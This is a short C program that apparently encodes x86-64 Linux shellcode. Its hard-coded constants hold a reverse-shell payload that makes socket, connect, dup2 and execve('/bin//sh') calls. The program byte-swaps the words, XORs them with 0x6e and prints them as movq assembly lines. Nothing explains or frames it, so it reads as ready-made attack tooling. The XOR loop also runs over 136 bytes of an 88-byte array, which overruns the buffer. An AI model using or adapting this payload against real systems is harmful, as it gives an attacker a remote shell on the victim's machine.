#include <stdint.h>
#include <stdio.h>

uint64_t a[] = { 0x6a29586a025f6a01, 0x5e31d20f0589c531,
                 0xc050b8fdff7a6966, 0x83f0ff506a2a5889,
                 0xef4889e66a105a0f, 0x56a025b6a215889,
                 0xef89de0f05ffcb79, 0xf331c05048ba2f62,
                 0x696e2f2f73685248, 0x89e7504889e25748,
                 0x89e66a3b58900f05 };

int main(void) {
	uint8_t *p;
	uint64_t b;

	for (uint32_t i = 0; i < 0xb; ++i) {
		b = a[i];

		a[i] = (b & 0xff) << 0x38 |
		       (b & 0xff00) << 0x28 |
		       (b & 0xff0000) << 0x18 |
		       (b & 0xff000000) << 0x8 |
		       ((b >> 0x38) & 0xff) |
		       ((b >> 0x28) & 0xff00) |
		       ((b >> 0x18) & 0xff0000) |
		       ((b >> 0x8) & 0xff000000);
	}

	p = (uint8_t *) a;

	for (uint32_t i = 0; i < 0x88; ++i) {
		p[i] ^= 0x6e;
	}

	for (uint32_t i = 0; i < 0xb; ++i) {
		printf("\tmovq\t$0x%0lx,%%rax\n", a[i]);
	}

	return 0;
}
